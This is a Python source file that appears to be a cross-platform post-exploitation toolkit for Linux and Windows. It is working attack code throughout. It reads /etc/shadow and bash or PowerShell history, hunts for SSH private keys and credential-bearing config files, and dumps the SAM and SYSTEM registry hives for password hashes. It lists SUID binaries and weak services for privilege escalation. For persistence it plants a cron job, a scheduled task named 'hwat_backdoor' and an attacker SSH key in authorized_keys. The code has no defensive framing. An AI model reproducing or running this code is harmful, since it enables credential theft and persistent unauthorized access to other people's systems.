import os
import subprocess
import platform
import getpass
import socket
import shutil
import json

def run_cmd(cmd):
    """Run a shell command and return stdout/stderr as string (cross-platform)."""
    try:
        return subprocess.getoutput(cmd)
    except Exception as e:
        return str(e)

def is_windows():
    return platform.system().lower() == "windows"

def is_linux():
    return platform.system().lower() == "linux"

def get_system_info():
    if is_windows():
        return get_system_info_windows()
    else:
        return get_system_info_unix()

def get_system_info_unix():
    return {
        "os": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "kernel": run_cmd("uname -a"),
        "whoami": getpass.getuser(),
    }

def get_system_info_windows():
    info = {}
    info["os"] = platform.system()
    info["platform"] = platform.platform()
    info["release"] = platform.release()
    info["version"] = platform.version()
    # hostname, username
    try:
        info["hostname"] = socket.gethostname()
    except:
        info["hostname"] = run_cmd("hostname")
    info["whoami"] = run_cmd("whoami")
    # basic systeminfo
    info["systeminfo"] = run_cmd("systeminfo")
    return info

def get_users():
    return get_users_windows() if is_windows() else get_users_unix()

def get_users_unix():
    return run_cmd("cat /etc/passwd")

def get_users_windows():
    # list users
    out = {}
    out["net_users"] = run_cmd("net user")
    # local groups membership
    out["local_groups"] = run_cmd("net localgroup")
    return out

def get_processes():
    return get_processes_windows() if is_windows() else get_processes_unix()

def get_processes_unix():
    return run_cmd("ps aux")

def get_processes_windows():
    return run_cmd("tasklist /v")

def get_network_info():
    return get_network_info_windows() if is_windows() else get_network_info_unix()

def get_network_info_unix():
    return run_cmd("netstat -tunlp 2>/dev/null || ss -tunlp")

def get_network_info_windows():
    # ipconfig + netstat
    return {
        "ipconfig": run_cmd("ipconfig /all"),
        "netstat": run_cmd("netstat -ano")
    }

def check_sudo_rights():
    if is_windows():
        return check_privileges_windows()
    else:
        return run_cmd("sudo -l")

def check_privileges_windows():
    """Who am I + privileges"""
    out = {}
    out["whoami"] = run_cmd("whoami /priv")
    out["groups"] = run_cmd("whoami /groups")
    out["user"] = run_cmd("whoami")
    return out

def find_suid_bins():
    if is_windows():
        return "Not applicable on Windows (use find services/scripts instead)"
    return run_cmd("find / -perm -4000 -type f 2>/dev/null")

def check_kernel_exploits():
    """Return kernel / OS version string for manual lookup against exploit databases."""
    if is_windows():
        return run_cmd("ver") + "\n" + run_cmd("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"")
    return run_cmd("uname -r")

def search_ssh_keys():
    if is_windows():
        return search_ssh_keys_windows()
    return run_cmd("find /home -name id_rsa 2>/dev/null || find / -name id_rsa 2>/dev/null")

def search_ssh_keys_windows():
    # look for common SSH key filenames
    locations = []
    users_dir = os.environ.get("USERPROFILE", "C:\\Users")
    # try some common paths
    candidates = [
        os.path.join(users_dir, "*", ".ssh", "id_rsa"),
        os.path.join(users_dir, "*", ".ssh", "id_ed25519"),
    ]
    for c in candidates:
        locations.append(run_cmd(f'dir /b /s "{c}" 2>nul'))
    return "\n".join(locations)

def search_config_files():
    if is_windows():
        # common app/config patterns
        return run_cmd('dir /s /b %USERPROFILE%\\*.config 2>nul || dir /s /b %USERPROFILE%\\*.xml 2>nul')
    return run_cmd("find / -name '*.conf' -o -name '*.ini' -o -name '*.yaml' 2>/dev/null")

def search_history():
    if is_windows():
        # Powershell history
        return run_cmd('cmd /c "for %f in (%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\Microsoft.PowerShell_* ) do @type %f 2>nul"')
    return run_cmd("cat /home/*/.bash_history 2>/dev/null || cat ~/.bash_history 2>/dev/null")

def add_cronjob(cmd, schedule="* * * * *"):
    if is_windows():
        return add_schtask(cmd)
    try:
        cron_entry = f"{schedule} {cmd}\n"
        run_cmd(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
        return "[+] Cronjob added."
    except Exception as e:
        return f"[-] Failed to add cronjob: {e}"

def add_schtask(cmd, name="hwat_backdoor", schedule="MINUTE"):
    """
    Add a scheduled task (attempt). Requires appropriate rights.
    schedule: MINUTE, HOURLY, DAILY, ONCE, etc.
    """
    try:
        # Using schtasks to create a task running cmd every minute (may require admin)
        # This is a simple attempt; adjust flags for your use-case.
        out = run_cmd(f'schtasks /Create /SC {schedule} /TN "{name}" /TR "{cmd}" /F')
        return out
    except Exception as e:
        return str(e)

def backdoor_ssh(pubkey):
    if is_windows():
        return "SSH backdoor via authorized_keys is not applicable in the same way on Windows"
    try:
        ssh_dir = os.path.expanduser("~/.ssh")
        os.makedirs(ssh_dir, exist_ok=True)
        auth_keys = os.path.join(ssh_dir, "authorized_keys")
        with open(auth_keys, "a") as f:
            f.write(pubkey.strip() + "\n")
        return f"[+] Backdoor SSH key added to {auth_keys}"
    except Exception as e:
        return f"[-] Failed to add SSH key: {e}"

def find_network_shares():
    return run_cmd("showmount -e 2>/dev/null || smbclient -L localhost -N 2>/dev/null") if not is_windows() else run_cmd("net view /all")

def dump_passwd_shadow():
    if is_windows():
        return "Not applicable on Windows; see registry hives functions"
    return run_cmd("cat /etc/shadow 2>/dev/null")

def extract_hashes_windows(save_dir=None):
    """
    Attempt to save SYSTEM and SAM hives (requires admin). If failed, returns message.
    WARNING: Saving hives requires admin; this function will fail without privileges.
    """
    if not is_windows():
        return "Windows-only function."
    out = {}
    sam_path = "%SystemRoot%\\system32\\config\\SAM"
    system_path = "%SystemRoot%\\system32\\config\\SYSTEM"
    if save_dir:
        os.makedirs(save_dir, exist_ok=True)
        out['SAM'] = run_cmd(f'reg save HKLM\\SAM "{os.path.join(save_dir,"SAM")}" 2>&1')
        out['SYSTEM'] = run_cmd(f'reg save HKLM\\SYSTEM "{os.path.join(save_dir,"SYSTEM")}" 2>&1')
    else:
        out['SAM'] = run_cmd(f'reg save HKLM\\SAM sam_backup 2>&1')
        out['SYSTEM'] = run_cmd(f'reg save HKLM\\SYSTEM system_backup 2>&1')
    return out

def list_services_windows():
    if not is_windows():
        return "Windows-only"
    return run_cmd("sc query type= service state= all")

def list_scheduled_tasks():
    if is_windows():
        return run_cmd("schtasks /query /fo LIST /v")
    else:
        return run_cmd("crontab -l 2>/dev/null || cat /etc/cron*/* 2>/dev/null")

def enum_installed_programs_windows():
    if not is_windows():
        return "Windows-only"
    return run_cmd('wmic product get name,version 2>nul || powershell "Get-WmiObject -Class Win32_Product | Select-Object Name,Version"')

def enum_weak_services_windows():
    """Look for services running as SYSTEM or with writable binary paths (possible priv-esc)."""
    if not is_windows():
        return "Windows-only"
    # Using sc query to get services; for thorough analysis one would parse service config
    raw = run_cmd("sc queryex type= service state= all")
    # Attempt to get service config list (may be large)
    cfg = run_cmd("wmic service get Name,DisplayName,PathName,StartMode,State /format:list")
    return {"raw_services": raw, "service_configs": cfg}

def find_common_windows_credentials():
    """
    Search for common credential files or app configs that often contain creds.
    This is a read-only search: looks for files with suspicious extensions or names.
    """
    if not is_windows():
        return "Windows-only"
    results = {}
    # common places: %USERPROFILE%, Desktop, Documents, AppData
    userprofile = os.environ.get("USERPROFILE", "C:\\Users")
    patterns = [
        "*.rdp", "*.rdp", "*.xml", "*.config", "*.env", "*.ini", "*.json", "*.log", "*.sql", "*.db", "*.mdb"
    ]
    hits = []
    for root, dirs, files in os.walk(userprofile):
        for f in files:
            for pat in patterns:
                if f.lower().endswith(pat.strip("*").lower()) or any(f.lower().endswith(ext.strip("*")) for ext in patterns):
                    hits.append(os.path.join(root, f))
        # limit depth to avoid performance issues
        if root.count(os.sep) - userprofile.count(os.sep) > 4:
            # don't recurse too deep by default
            continue
    results["hits_sample"] = hits[:200]
    return results

def full_recon():
    """Run a full post-exploitation reconnaissance and return a dict report."""
    report = {}
    report["system_info"] = get_system_info()
    report["whoami_priv"] = check_privileges_windows() if is_windows() else run_cmd("id")
    report["sudo_rights"] = check_sudo_rights()
    report["suid_bins"] = find_suid_bins() if not is_windows() else None
    report["kernel_version"] = check_kernel_exploits()
    report["ssh_keys"] = search_ssh_keys()
    report["config_files"] = search_config_files()
    report["bash_history"] = search_history()
    report["network_shares"] = find_network_shares()
    if is_windows():
        report["services"] = list_services_windows()
        report["scheduled_tasks"] = list_scheduled_tasks()
        report["installed_programs"] = enum_installed_programs_windows()
        report["weak_services"] = enum_weak_services_windows()
        report["common_creds"] = find_common_windows_credentials()
    return report

# Optional pretty print helper
def pretty_report(report):
    try:
        return json.dumps(report, indent=2, default=str)
    except Exception:
        return str(report)
